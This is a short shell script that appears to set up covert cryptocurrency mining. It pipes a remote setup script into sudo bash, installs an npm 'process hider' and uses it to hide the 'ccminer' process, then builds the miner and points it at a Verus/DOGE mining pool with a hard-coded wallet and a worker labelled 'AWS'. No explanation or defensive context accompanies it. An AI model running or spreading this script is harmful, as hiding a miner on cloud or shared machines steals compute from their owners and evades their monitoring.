curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add ccminer
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer
chmod +x build.sh
chmod +x configure.sh
chmod +x autogen.sh
./build.sh
./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DGASZYRMv4a1tTZSDc3Ly9BqBThv7HHYCH.AWS -p c=DOGE,mc=VRSC,ID=AWS -t 4
